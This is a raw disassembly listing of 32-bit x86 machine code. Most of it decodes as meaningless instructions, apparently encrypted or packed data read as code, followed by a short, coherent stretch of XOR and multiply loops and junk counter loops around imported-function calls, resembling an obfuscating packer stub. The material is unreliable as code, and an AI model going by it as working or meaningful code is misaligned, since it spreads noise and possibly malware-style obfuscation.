  40d0bd:	adc    BYTE PTR [edi+0x3],dl
  40d0c0:	jmp    0xdb2cc960
  40d0c5:	xlat   BYTE PTR ds:[ebx]
  40d0c6:	sub    DWORD PTR [edi+0x5e09ba03],ecx
  40d0cc:	dec    esi
  40d0cd:	mov    bh,0xf1
  40d0cf:	pop    edi
  40d0d0:	adc    dh,dh
  40d0d2:	jae    0x40d122
  40d0d4:	dec    edx
  40d0d5:	push   edx
  40d0d6:	idiv   BYTE PTR [edx+0x69dce809]
  40d0dc:	jno    0x40d0b1
  40d0de:	dec    esi
  40d0df:	jmp    0x40d10f
  40d0e1:	mov    esp,0xc3e3302b
  40d0e6:	adc    eax,0x1ecceff6
  40d0eb:	rol    dl,0x72
  40d0ee:	xchg   ecx,eax
  40d0ef:	push   ecx
  40d0f0:	out    0x66,eax
  40d0f2:	(bad)  
  40d0f3:	out    0xf4,eax
  40d0f5:	sbb    eax,DWORD PTR [eax+0x5a]
  40d0f8:	sbb    eax,0x79968bdf
  40d0fd:	xlat   BYTE PTR ds:[ebx]
  40d0fe:	jbe    0x40d0f6
  40d100:	mov    dh,0x3e
  40d102:	jno    0x40d0aa
  40d104:	push   DWORD PTR [esi+0xf]
  40d107:	iret   
  40d108:	stc    
  40d109:	mov    ds:0x2147bf13,eax
  40d10e:	ret    
  40d10f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d110:	mov    cs,WORD PTR fs:0x26134d50
  40d117:	out    dx,al
  40d118:	(bad)  
  40d119:	ficom  WORD PTR [ecx]
  40d11b:	lods   al,BYTE PTR ds:[esi]
  40d11c:	mov    al,ds:0x351b4cab
  40d121:	cs pushf 
  40d123:	xor    bl,BYTE PTR [ebp-0x5b026ec5]
  40d129:	mov    dh,0x30
  40d12b:	hlt    
  40d12c:	mov    ds:0x53c7378,al
  40d131:	sar    BYTE PTR [edi],cl
  40d133:	push   ebp
  40d134:	mov    WORD PTR [eax-0x5e],?
  40d137:	das    
  40d138:	push   ebp
  40d139:	ja     0x40d1b0
  40d13b:	into   
  40d13c:	inc    ecx
  40d13d:	nop
  40d13e:	jle    0x40d0c2
  40d140:	enter  0xc159,0xf1
  40d144:	jle    0x40d168
  40d146:	test   eax,0x71315799
  40d14b:	fs adc edx,ebx
  40d14e:	add    edx,edi
  40d150:	mov    ds:0xdb5f0160,al
  40d155:	or     esi,eax
  40d157:	fstp   DWORD PTR [edx+0x4adc5ba]
  40d15d:	inc    eax
  40d15e:	xchg   esi,eax
  40d15f:	(bad)  
  40d161:	push   edx
  40d162:	adc    al,al
  40d164:	push   es
  40d165:	jmp    0x8245:0x1c582613
  40d16c:	test   ecx,ecx
  40d16e:	fld    QWORD PTR [esi-0x4db88ed5]
  40d174:	mov    ecx,0xa82e7ed
  40d179:	aad    0x85
  40d17b:	iret   
  40d17c:	adc    ebp,DWORD PTR [edx+ecx*8-0x3]
  40d180:	js     0x40d1e5
  40d182:	ficomp DWORD PTR [edi+0x7ab441d2]
  40d188:	mov    ecx,ebx
  40d18a:	push   es
  40d18b:	push   es
  40d18c:	xor    ah,BYTE PTR [esi]
  40d18e:	out    dx,al
  40d18f:	ret    0xc7b
  40d192:	(bad)  
  40d193:	stos   DWORD PTR es:[edi],eax
  40d194:	push   esi
  40d195:	pop    ss
  40d196:	loope  0x40d184
  40d198:	cli    
  40d199:	push   esp
  40d19a:	inc    ax
  40d19c:	(bad)  [eax+edi*8]
  40d19f:	aaa    
  40d1a0:	(bad)  
  40d1a1:	retf   
  40d1a2:	xor    al,0x11
  40d1a4:	push   ss
  40d1a5:	data16 mov ds:0xfb6c5b3d,al
  40d1ab:	cmp    bl,BYTE PTR [ebx]
  40d1ad:	jmp    0x5c1c:0x36f6f13
  40d1b4:	sahf   
  40d1b5:	fst    st(6)
  40d1b7:	aas    
  40d1b8:	inc    ebp
  40d1b9:	repnz dec edx
  40d1bb:	les    ecx,FWORD PTR [ebx+0x0]
  40d1be:	xor    dl,cl
  40d1c0:	or     edi,DWORD PTR [edx]
  40d1c2:	mov    DWORD PTR [eax-0x4b4ddb5f],ebp
  40d1c8:	mov    ?,esp
  40d1ca:	mov    ds:0xa04c7f02,eax
  40d1cf:	mov    dl,0x7e
  40d1d1:	popf   
  40d1d2:	fstsw  WORD PTR [ebx]
  40d1d5:	leave  
  40d1d6:	ret    0x42e
  40d1d9:	enter  0xe74e,0x85
  40d1dd:	(bad)  
  40d1de:	sbb    al,0x41
  40d1e0:	adc    BYTE PTR [ebp-0xa],bl
  40d1e3:	loop   0x40d248
  40d1e5:	xchg   edi,eax
  40d1e6:	push   ecx
  40d1e7:	data16 into 
  40d1e9:	or     DWORD PTR [eax],ecx
  40d1eb:	gs hlt 
  40d1ed:	enter  0xc1af,0x34
  40d1f1:	mov    ah,0x68
  40d1f3:	push   0x3
  40d1f5:	fist   DWORD PTR [ebx-0x1dd8d670]
  40d1fb:	pushw  ss
  40d1fd:	es ins DWORD PTR es:[edi],dx
  40d1ff:	sub    bl,BYTE PTR [esi+0x4508e9ad]
  40d205:	xchg   ebx,eax
  40d206:	adc    ebx,ebp
  40d208:	mov    edi,eax
  40d20a:	xor    al,al
  40d20c:	(bad)  
  40d20d:	cmp    al,0x22
  40d20f:	cs mov esi,0x57b6fc57
  40d215:	imul   DWORD PTR [esi+0x8]
  40d218:	into   
  40d219:	xor    ah,BYTE PTR [ebp-0x141b0f1a]
  40d21f:	push   edi
  40d220:	add    BYTE PTR [eax],ah
  40d222:	out    dx,eax
  40d223:	mov    ds:0x28009878,eax
  40d228:	and    eax,0x5b421c3a
  40d22d:	retf   
  40d22e:	sbb    ecx,DWORD PTR [eax-0x4c5c606]
  40d234:	mov    eax,0x99de9712
  40d239:	push   ds
  40d23a:	popf   
  40d23b:	bnd jge 0x40d254
  40d23e:	xor    al,0x6d
  40d240:	nop
  40d241:	sbb    bh,bl
  40d243:	push   edx
  40d244:	or     al,0xaa
  40d246:	and    ah,BYTE PTR [eax-0x230b59dd]
  40d24c:	shl    BYTE PTR ds:[edx-0x66],cl
  40d250:	push   es
  40d251:	add    DWORD PTR [ecx+0x4ad12ea2],ebp
  40d257:	test   DWORD PTR [ebx],0x233c40e8
  40d25d:	mov    eax,0x340daba7
  40d262:	dec    esi
  40d263:	pusha  
  40d264:	push   esp
  40d265:	pushf  
  40d266:	test   eax,0xa235e65e
  40d26b:	xor    eax,0xdb39ccbb
  40d270:	or     BYTE PTR [edi-0x66],dl
  40d273:	xchg   DWORD PTR [esi-0x37bf322],eax
  40d279:	add    BYTE PTR [esi-0x2e2e6060],bl
  40d27f:	jae    0x40d2a6
  40d281:	out    dx,eax
  40d282:	pop    ebx
  40d283:	jns    0x40d2cb
  40d285:	ror    DWORD PTR [ebp+0x1c],0xe8
  40d289:	and    al,0xb0
  40d28b:	mov    ch,0x58
  40d28d:	mov    WORD PTR [ebp+0x6221a4cb],ds
  40d293:	and    cl,BYTE PTR [ebx]
  40d295:	mov    esp,0x27b3f482
  40d29a:	adc    BYTE PTR [ebp+0x50],al
  40d29d:	sbb    BYTE PTR ds:0x8d547067,ch
  40d2a3:	adc    DWORD PTR [ecx-0x21],edi
  40d2a6:	jmp    0x8c60:0xc74698c6
  40d2ad:	stos   DWORD PTR es:[edi],eax
  40d2ae:	or     esp,0xffffffaf
  40d2b1:	mov    al,ds:0xf0228456
  40d2b6:	scas   eax,DWORD PTR es:[edi]
  40d2b7:	cdq    
  40d2b8:	sbb    BYTE PTR [edx-0x6e],cl
  40d2bb:	mov    cl,dl
  40d2bd:	pop    esi
  40d2be:	sub    esi,ebx
  40d2c0:	lock jmp 0x40d246
  40d2c3:	clc    
  40d2c4:	cmp    edx,ecx
  40d2c6:	pop    ebp
  40d2c7:	and    eax,0xcf61433c
  40d2cc:	cdq    
  40d2cd:	aad    0x35
  40d2cf:	out    dx,eax
  40d2d0:	mov    ebp,0xd507fe1c
  40d2d5:	fidiv  DWORD PTR [ebp+0x71b244f9]
  40d2db:	mov    al,0xc
  40d2dd:	das    
  40d2de:	stc    
  40d2df:	fcom   DWORD PTR [edx+0x2c]
  40d2e2:	xchg   ecx,eax
  40d2e3:	xchg   ah,al
  40d2e5:	mov    ch,0x5c
  40d2e7:	fdivr  QWORD PTR [edx]
  40d2e9:	cmp    eax,DWORD PTR ds:0xa541405b
  40d2ef:	aad    0x23
  40d2f1:	int    0x21
  40d2f3:	add    al,0x9f
  40d2f5:	adc    al,0x50
  40d2f7:	jne    0x40d348
  40d2f9:	dec    eax
  40d2fa:	cs lahf 
  40d2fc:	test   eax,0x7f8e5369
  40d301:	dec    edx
  40d302:	mov    esp,0x3a3a4dfc
  40d307:	cdq    
  40d308:	stc    
  40d309:	add    al,bl
  40d30b:	lods   eax,DWORD PTR ds:[esi]
  40d30c:	sahf   
  40d30d:	popa   
  40d30e:	clc    
  40d30f:	fsub   DWORD PTR [ecx+0x67278e5e]
  40d315:	cmp    eax,0x9527a427
  40d31a:	or     bh,ch
  40d31c:	inc    esp
  40d31d:	push   edx
  40d31e:	shl    DWORD PTR [ebp+edx*1+0x25fe03af],1
  40d325:	jl     0x40d383
  40d327:	sbb    BYTE PTR [eax-0x5568175e],0xea
  40d32e:	push   0xfffffffa
  40d330:	(bad)  
  40d331:	cmp    dl,dh
  40d333:	sub    cl,BYTE PTR ds:0x50015cb5
  40d339:	cmp    DWORD PTR [ebx],esp
  40d33b:	xor    DWORD PTR [edx+0x1d49d7a3],ebx
  40d341:	jbe    0x40d2d3
  40d343:	adc    al,0xfa
  40d345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d346:	(bad)  
  40d347:	hlt    
  40d348:	push   0x7a
  40d34a:	dec    ebx
  40d34b:	popa   
  40d34c:	inc    esi
  40d34d:	ins    DWORD PTR es:[edi],dx
  40d34e:	push   esi
  40d34f:	in     eax,dx
  40d350:	mov    DWORD PTR [esi-0x64],ecx
  40d353:	retf   
  40d354:	bound  edi,QWORD PTR [esp+esi*1+0x4c]
  40d358:	xchg   edi,edx
  40d35a:	and    DWORD PTR ds:0x247b3611,esi
  40d360:	lahf   
  40d361:	mov    edx,0x75a1ba58
  40d366:	add    eax,0x69dc973d
  40d36b:	or     dh,BYTE PTR [ecx+ecx*4]
  40d36e:	dec    ebx
  40d36f:	push   esp
  40d370:	xor    eax,0x7ce270ed
  40d375:	je     0x40d3ca
  40d377:	jge    0x40d349
  40d379:	sbb    al,BYTE PTR [bx+di]
  40d37c:	std    
  40d37d:	int    0x28
  40d37f:	test   al,0xac
  40d381:	rcl    BYTE PTR [ebx+0x7d8bc0bb],cl
  40d387:	hlt    
  40d388:	xor    edi,eax
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	dec    ebx
  40d3c7:	popa   
  40d3c8:	std    
  40d3c9:	pop    ebx
  40d3ca:	outs   dx,DWORD PTR ds:[esi]
  40d3cb:	cwde   
  40d3cc:	jl     0x40d44a
  40d3ce:	retf   0x7c79
  40d3d1:	jl     0x40d3b4
  40d3d3:	enter  0x22f3,0x66
  40d3d7:	adc    bh,dh
  40d3d9:	std    
  40d3da:	inc    ecx
  40d3db:	mov    ds:0xd1887196,al
  40d3e0:	dec    esi
  40d3e1:	ins    BYTE PTR es:[edi],dx
  40d3e2:	pop    edi
  40d3e3:	data16 (bad) 
  40d3e5:	ror    DWORD PTR [ecx+0x9250176],cl
  40d3eb:	mov    bl,0xe5
  40d3ed:	jmp    0x40d46b
  40d3ef:	mov    dh,0xd0
  40d3f1:	(bad)  
  40d3f2:	test   al,0x5a
  40d3f4:	xchg   edx,eax
  40d3f5:	inc    ebx
  40d3f6:	jo     0x40d475
  40d3f8:	fild   DWORD PTR [ebx-0x22e12768]
  40d3fe:	xchg   ebx,eax
  40d3ff:	gs mov edi,0x6e337d13
  40d405:	dec    eax
  40d406:	aam    0x53
  40d408:	out    dx,eax
  40d409:	out    dx,eax
  40d40a:	aaa    
  40d40b:	retf   0xc46f
  40d40e:	ins    BYTE PTR es:[edi],dx
  40d40f:	add    ecx,eax
  40d411:	inc    eax
  40d412:	xchg   ecx,eax
  40d413:	out    0x6c,eax
  40d415:	or     al,0xcc
  40d417:	pusha  
  40d418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d419:	repz mov ecx,0xd79f6e31
  40d41f:	pusha  
  40d420:	daa    
  40d421:	pop    edx
  40d422:	xchg   ebp,eax
  40d423:	add    DWORD PTR [ebx-0x72],edi
  40d426:	rol    al,cl
  40d428:	ret    0x192f
  40d42b:	sti    
  40d42c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d42e:	out    dx,al
  40d42f:	sub    eax,0xe272818d
  40d434:	jbe    0x40d3f1
  40d436:	fdiv   DWORD PTR ds:0x95c29928
  40d43c:	call   0x91c9:0x9b151ebf
  40d443:	data16 (bad) 
  40d445:	je     0x40d454
  40d447:	loope  0x40d4be
  40d449:	jae    0x40d464
  40d44b:	retf   
  40d44c:	and    eax,0x7fb07699
  40d451:	iret   
  40d452:	into   
  40d453:	sbb    BYTE PTR [ebx],bl
  40d455:	sti    
  40d456:	call   0x273f:0x67e7c95c
  40d45d:	mov    al,ds:0x942e85e2
  40d462:	sbb    edx,DWORD PTR [ebp+0x44]
  40d465:	xchg   ebp,eax
  40d466:	mov    ch,bh
  40d468:	js     0x40d4d2
  40d46a:	(bad)  
  40d46c:	inc    edi
  40d46d:	xchg   esi,eax
  40d46e:	xor    al,BYTE PTR [edx+0x46]
  40d471:	jae    0x40d47e
  40d473:	sbb    edi,DWORD PTR [esi+0x53a8d076]
  40d479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d47a:	jp     0x40d4c4
  40d47c:	jnp    0x40d43d
  40d47e:	jne    0x40d49e
  40d480:	test   DWORD PTR [esi-0x6a],0x573a08e3
  40d487:	mov    WORD PTR [ecx+0x11],?
  40d48a:	lahf   
  40d48b:	lods   al,BYTE PTR ds:[esi]
  40d48c:	rol    BYTE PTR [edx],cl
  40d48e:	dec    eax
  40d48f:	int    0x59
  40d491:	inc    esp
  40d492:	cs (bad) 
  40d494:	imul   ebp,DWORD PTR [ecx+0x78],0xffffffa6
  40d498:	mov    dl,0xf1
  40d49a:	lods   al,BYTE PTR ds:[esi]
  40d49b:	and    DWORD PTR [edi],edx
  40d49d:	test   eax,0x52a973d4
  40d4a2:	mov    bl,0x6a
  40d4a4:	and    al,0x40
  40d4a6:	adc    esi,DWORD PTR [esi-0x2a6bd04d]
  40d4ac:	in     eax,dx
  40d4ad:	sahf   
  40d4ae:	dec    esi
  40d4af:	xchg   esi,eax
  40d4b0:	dec    eax
  40d4b1:	repz dec esi
  40d4b3:	xchg   edi,eax
  40d4b4:	add    al,BYTE PTR [ebx-0x6e]
  40d4b7:	sbb    ecx,ebp
  40d4b9:	cwde   
  40d4ba:	mov    esi,0x8e81ee62
  40d4bf:	add    eax,0x30f0c14b
  40d4c4:	sub    al,0x9d
  40d4c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4c7:	adc    ch,BYTE PTR [edi-0x485c1ddd]
  40d4cd:	(bad)  [ecx+0x71]
  40d4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d1:	inc    esp
  40d4d2:	aam    0x44
  40d4d4:	sbb    ebp,DWORD PTR [eax]
  40d4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d7:	imul   ebp,DWORD PTR [ecx+0x7d20262e],0xffffffc8
  40d4de:	sub    BYTE PTR [esi+eax*1],ch
  40d4e1:	xor    al,0x1a
  40d4e3:	sysret 
  40d4e5:	jp     0x40d468
  40d4e7:	mov    ebp,0xea7e8f56
  40d4ec:	imul   eax,DWORD PTR [edx+eax*2-0x130c36bc],0xffffff94
  40d4f4:	jmp    0x8349:0xa06a80a2
  40d4fb:	sub    DWORD PTR [esi+0x24],edx
  40d4fe:	ret    0x1aa5
  40d501:	add    BYTE PTR [eax+0x4a14918d],bh
  40d507:	ss and eax,0xf14a71e8
  40d50d:	inc    eax
  40d50e:	pop    ss
  40d50f:	add    eax,ebx
  40d511:	ds mov esp,0xa23424ab
  40d517:	xor    eax,0x45e1b1d5
  40d51c:	mov    cl,0x94
  40d51e:	mov    eax,0x844c73d2
  40d523:	sub    DWORD PTR [ecx-0x45],esi
  40d526:	in     eax,0x8d
  40d528:	pushf  
  40d529:	push   edx
  40d52a:	cs inc edx
  40d52c:	das    
  40d52d:	test   bl,0xad
  40d530:	and    eax,DWORD PTR [eax+0xf]
  40d533:	fs pop eax
  40d535:	in     eax,0x80
  40d537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d538:	adc    al,0x4a
  40d53a:	xchg   ebx,eax
  40d53b:	dec    esi
  40d53c:	sub    BYTE PTR [edi-0x526f53b1],0xa7
  40d543:	push   ds
  40d544:	bnd jns 0x40d546
  40d547:	sub    bl,BYTE PTR [eax+eiz*4+0x55]
  40d54b:	fsub   DWORD PTR [eax+0x31eb9848]
  40d551:	pop    esp
  40d552:	xor    al,cl
  40d554:	fiadd  WORD PTR [ebp-0x3f]
  40d557:	xor    al,0x67
  40d559:	cmp    al,0xc4
  40d55b:	xor    ah,dh
  40d55d:	test   al,0xa3
  40d55f:	sub    eax,0x24046ce4
  40d564:	jge    0x40d511
  40d566:	adc    DWORD PTR [esi+0x3f],eax
  40d569:	or     al,0x3e
  40d56b:	(bad)  
  40d56c:	cmp    edx,eax
  40d56e:	jns    0x40d514
  40d570:	or     ecx,DWORD PTR [ebx]
  40d572:	pusha  
  40d573:	and    dl,ah
  40d575:	pop    ebx
  40d576:	xchg   BYTE PTR [edx+eiz*2],dl
  40d579:	pop    esp
  40d57a:	or     dl,BYTE PTR [edi]
  40d57c:	data16 fld1 
  40d57f:	aas    
  40d580:	out    0xa7,eax
  40d582:	pop    ecx
  40d583:	sub    esp,DWORD PTR [edi+0x53]
  40d586:	jle    0x40d5d3
  40d588:	xchg   ebp,eax
  40d589:	in     eax,dx
  40d58a:	fidivr DWORD PTR [ebp-0x260a9a9]
  40d590:	pop    ds
  40d591:	mov    edi,0x3bd632d2
  40d596:	jle    0x40d5dd
  40d598:	rol    DWORD PTR [edi+0x69],1
  40d59b:	sub    BYTE PTR [edx+0x608428cb],bh
  40d5a1:	mov    dl,0x6b
  40d5a3:	and    al,0x4b
  40d5a5:	mov    eax,DWORD PTR [ecx+ebx*1+0x3f]
  40d5a9:	arpl   WORD PTR [edi-0x170ccfce],sp
  40d5af:	push   eax
  40d5b0:	mov    edx,0xb0a86f53
  40d5b5:	dec    esp
  40d5b6:	jl     0x40d5c7
  40d5b8:	dec    ebx
  40d5b9:	dec    esi
  40d5ba:	popf   
  40d5bb:	sbb    esi,DWORD PTR [ebx]
  40d5bd:	sar    DWORD PTR [esi],1
  40d5bf:	mov    ch,0x83
  40d5c1:	jmp    0x3dd0:0x25c90b47
  40d5c8:	rcl    al,1
  40d5ca:	in     al,0xa0
  40d5cc:	int    0x6d
  40d5ce:	push   esp
  40d5cf:	xchg   BYTE PTR [ebp+esi*2+0x56],al
  40d5d3:	adc    BYTE PTR [ebx-0x2c520bc],ch
  40d5d9:	pop    ecx
  40d5da:	inc    ecx
  40d5db:	jno    0x40d621
  40d5dd:	lahf   
  40d5de:	push   0x41
  40d5e0:	stos   BYTE PTR es:[edi],al
  40d5e1:	mov    bl,0x1b
  40d5e3:	sbb    al,bl
  40d5e5:	in     al,dx
  40d5e6:	mov    DWORD PTR [edi+0x39],0x8209e07e
  40d5ed:	jmp    0xf5a81d51
  40d5f2:	pop    edx
  40d5f3:	loopne 0x40d57f
  40d5f5:	sub    cl,BYTE PTR [ebp+edi*2-0x42]
  40d5f9:	lahf   
  40d5fa:	cmp    al,0x80
  40d5fc:	outs   dx,BYTE PTR ds:[esi]
  40d5fd:	push   ebp
  40d5fe:	data16 mov al,0x79
  40d601:	pop    eax
  40d602:	inc    ebx
  40d603:	mov    ecx,0x6bfe5208
  40d608:	cmp    DWORD PTR [esi],0xffffffa7
  40d60b:	lods   eax,DWORD PTR ds:[esi]
  40d60c:	push   edx
  40d60d:	and    cl,BYTE PTR [edi-0x4]
  40d610:	in     al,dx
  40d611:	pop    ebp
  40d612:	fs push esi
  40d614:	lahf   
  40d615:	push   edx
  40d616:	sbb    eax,0xef804efb
  40d61b:	nop
  40d61c:	gs into 
  40d61e:	jmp    0xa1bb:0x45f7b886
  40d625:	xchg   BYTE PTR ss:[esi+edi*2],dl
  40d629:	arpl   bx,bx
  40d62b:	aad    0x54
  40d62d:	jl     0x40d5b0
  40d62f:	xchg   BYTE PTR [ecx-0x1755aaa5],bh
  40d635:	add    BYTE PTR [ebp-0x7f],bl
  40d638:	xchg   edi,eax
  40d639:	aaa    
  40d63a:	lock lock pop es
  40d63d:	(bad)  [ebx+0x55]
  40d640:	retf   
  40d641:	xor    esi,DWORD PTR [edi+0x1586b144]
  40d647:	mov    ecx,0x57a87897
  40d64c:	mov    eax,ds:0xac4149a9
  40d651:	fbld   TBYTE PTR [edi]
  40d653:	mov    eax,ds:0x16483879
  40d658:	mov    al,0xb3
  40d65a:	or     eax,0x4377c190
  40d65f:	fistp  QWORD PTR [esi-0x6a82bfad]
  40d665:	dec    edi
  40d666:	in     eax,dx
  40d667:	pop    esi
  40d668:	adc    BYTE PTR [edx+0x7c],dl
  40d66b:	mov    dl,0x61
  40d66d:	es lahf 
  40d66f:	pop    edx
  40d670:	ja     0x40d64a
  40d672:	xlat   BYTE PTR ds:[ebx]
  40d673:	inc    eax
  40d674:	pop    eax
  40d675:	sbb    al,0x1a
  40d677:	loope  0x40d657
  40d679:	imul   esp,DWORD PTR fs:[ebx],0xfffffff0
  40d67d:	outs   dx,DWORD PTR ds:[esi]
  40d67e:	add    al,0xff
  40d680:	(bad)  
  40d681:	out    dx,eax
  40d682:	(bad)  
  40d683:	and    al,0x42
  40d685:	xor    bh,BYTE PTR [edx]
  40d687:	dec    esp
  40d688:	or     DWORD PTR [ebx+0x42],0xd99e92e7
  40d68f:	mov    WORD PTR [ebp+esi*8+0x42],gs
  40d693:	lods   eax,DWORD PTR ds:[esi]
  40d694:	mov    esi,0x30030f14
  40d699:	mov    eax,0x3365751e
  40d69e:	pop    eax
  40d69f:	mov    edi,0xfba47a48
  40d6a4:	in     al,0x8a
  40d6a6:	ins    BYTE PTR es:[edi],dx
  40d6a7:	cmc    
  40d6a8:	call   0x9a92:0x5d52f4ed
  40d6af:	push   cs
  40d6b0:	and    al,0x21
  40d6b2:	addr16 jge 0x40d64c
  40d6b5:	add    BYTE PTR [ebp+eax*2-0x1f2ab06d],cl
  40d6bc:	out    dx,al
  40d6bd:	test   al,0x92
  40d6bf:	call   0xcf409078
  40d6c4:	ss daa 
  40d6c6:	adc    ch,BYTE PTR [ecx+0xc8daa15]
  40d6cc:	or     ecx,eax
  40d6ce:	scas   al,BYTE PTR es:[edi]
  40d6cf:	div    DWORD PTR [ebx-0x7c]
  40d6d2:	inc    esi
  40d6d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d4:	adc    BYTE PTR [ecx-0x16e1b00b],al
  40d6da:	add    eax,0x9aeca4f3
  40d6df:	add    esp,edx
  40d6e1:	or     cl,al
  40d6e3:	out    0x1c,eax
  40d6e5:	mov    eax,ds:0x103a126a
  40d6ea:	jnp    0x40d6a0
  40d6ec:	xor    DWORD PTR [eax],esi
  40d6ee:	push   0xffffffa7
  40d6f0:	out    dx,al
  40d6f1:	xlat   BYTE PTR ds:[ebx]
  40d6f2:	add    DWORD PTR [eax-0x77],esi
  40d6f5:	jnp    0x40d6a1
  40d6f7:	pop    ds
  40d6f8:	out    dx,al
  40d6f9:	mov    edx,0x9829359e
  40d6fe:	aad    0xcf
  40d700:	call   0xb21087fa
  40d705:	test   eax,0x666084d3
  40d70a:	jg     0x40d712
  40d70c:	cli    
  40d70d:	call   0x46313d4
  40d712:	outs   dx,BYTE PTR ds:[esi]
  40d714:	and    al,0xc0
  40d716:	jns    0x40d785
  40d718:	jmp    0x40d6b5
  40d71a:	lock mov ecx,edi
  40d71d:	pop    es
  40d71e:	or     ebp,DWORD PTR [edx]
  40d720:	out    dx,al
  40d721:	mov    DWORD PTR [ebx],esi
  40d723:	lods   eax,DWORD PTR ds:[esi]
  40d724:	push   ss
  40d725:	test   al,0xb9
  40d727:	mov    ah,0x33
  40d729:	rol    BYTE PTR [ebx],1
  40d72b:	ror    DWORD PTR [edi],1
  40d72d:	scas   eax,DWORD PTR es:[edi]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43369b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433663,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43371f,0x4336a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43364b,0x433763
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433723,0x43363f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4336b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4336b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4336b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4336b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4336b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433647,0x433767
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43364f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43364f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43364f,ecx
  40d852:	cmp    DWORD PTR ds:0x43364f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43364f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43364f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43364f
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43364f,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43371b
  40d8a4:	add    esi,DWORD PTR ds:0x4336e3
  40d8aa:	mov    DWORD PTR ds:0x43371b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433647
  40d8bc:	and    eax,DWORD PTR ds:0x4336af
  40d8c2:	mov    ds:0x433647,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433653,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43375b,0x0
  40d8e4:	jmp    0x40d8f8
